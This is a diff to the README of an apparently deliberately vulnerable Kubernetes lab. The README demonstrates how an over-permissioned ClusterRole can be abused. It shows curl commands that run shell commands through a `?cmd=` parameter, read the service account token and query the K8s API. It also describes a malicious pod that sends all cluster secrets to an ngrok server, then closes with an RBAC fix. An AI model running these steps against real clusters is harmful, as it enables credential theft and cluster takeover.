@@ -12,6 +12,7 @@ Misconfiguring a resource can result K8 cluster components performing outside of
 We'd like to demo what can happen if one managed to access a wrongfully-permissioned resource (via a container in this case);
 
 Our demo begins **after** one has achieved RCE on a cluster container and will showcase what can happen starting from that point;
+
 > We chose not to demo RCE-achieving on a container as this diverges from the intent of this demo and was also demoed before.  
 
 That being said, the steps will begin by interacting with one of the containers themselves as in you were in already in RCE state 
@@ -37,6 +38,9 @@ This will do the following:
   <summary>Spoiler alert</summary>
 As we explained, we start our journey from the "ci app" and perform RCE using it;
 The way we interact w/ the app is via HTTP requests to `/?cmd=<ANY_BASH_CMD>`;
+
+> This means that we execute the commands inside a pod!
+>
 That being said, let's fetch the IP of this service initially from within our local cluster:
 
 ```
@@ -47,22 +51,23 @@ This should return something like: `http://192.168.39.72:30553`
  
 > From this point on we will use `` to evaluate bash commands;
 
-Run ls:
+Let's start w/ a small tests - run `ls`:
 ````
 curl `minikube service ci-service --url=true`?cmd=ls
 ````
 
-See all env variables:
+Now let's list all env variables:
+> Do note `KUBE_TOKEN` and `KUBERNETES_PORT_443_TCP_PORT` in the dump 
 ````
 curl `minikube service ci-service --url=true`?cmd=env
 ````
 
-Get the token
+Get the service account token from `/run/secrets/kubernetes.io/serviceaccount/token`:
 ````
 curl `minikube service ci-service --url=true`?cmd=cat%20/run/secrets/kubernetes.io/serviceaccount/token
 ````
 
-Query for admin stuff using `KUBE_TOKEN` and the [K8 API](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)
+Now that we have the inner K8 token, we can query for admin stuff using `KUBE_TOKEN` and the [K8 API](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)
 > Each example will contain a `decoded` and `encoded` parts; Each has the same payload, tho the encoded version is URI encoded, so we can use spaces etc
 > 
 > Use this website to uri encode for easy encoding: https://meyerweb.com/eric/tools/dencoder/
@@ -98,7 +103,7 @@ cat > nginx-pod.json <<EOF
     "apiVersion": "v1",
     "kind": "Pod",
     "metadata": {
-        "name": "nginx1"
+        "name": "nginx-pod"
     },
     "spec": {
         "containers": [
@@ -138,7 +143,7 @@ This is it! :)
 From this point one can tap into the privileged container and "break out of it";
 
 #### 2. Malicious Pod
-Below is an example of pod that dispatches (via simple `curl`) all the k8 secrets;
+Below is an example of pod. This pod is malicious as it dispatches (via simple `curl`) all the k8 secrets once running;
 > I'm using ngrok for simple globally-accessible local server. [See here for installation](https://dashboard.ngrok.com/get-started/setup).
 >
 > Once installed, initiate the server (`$ ngrok http 3000`)and swap the IP in the malicious pod to the one from your ngrok client; 
@@ -153,7 +158,7 @@ cat > bad-pod.json <<EOF
 	"apiVersion": "v1",
 	"kind": "Pod",
 	"metadata": {
-		"name": "nginx2",
+		"name": "bad-pod",
 	},
 	"spec": {
 		"containers": [
@@ -193,4 +198,26 @@ KUBE_TOKEN%3D%60cat%20%2Fvar%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2F
 
 ### Fix
 
-To fix this problem one should set the role permissions when defining the cluster role; Simple yet dangerous;  
+To fix this problem one should set the role permissions when defining a cluster role.
+For example, in our cluster we have defined the following `ClusterRole`:
+```
+kind: ClusterRole
+apiVersion: rbac.authorization.k8s.io/v1
+metadata:
+  name: ci-role
+rules:
+  - apiGroups: [""]
+    resources: ["*"]
+    verbs: ["*"]
+``` 
+A more secure version for the same role, would look something like this:
+```
+kind: ClusterRole
+apiVersion: rbac.authorization.k8s.io/v1
+metadata:
+  name: ci-role
+rules:
+  - apiGroups: [""] # empty string indicates the core api group
+    resources: ["pods"] # note that we specify resources, and not wildcard
+    verbs: ["get"] # actions w.r.t the allowed resources
+``` 
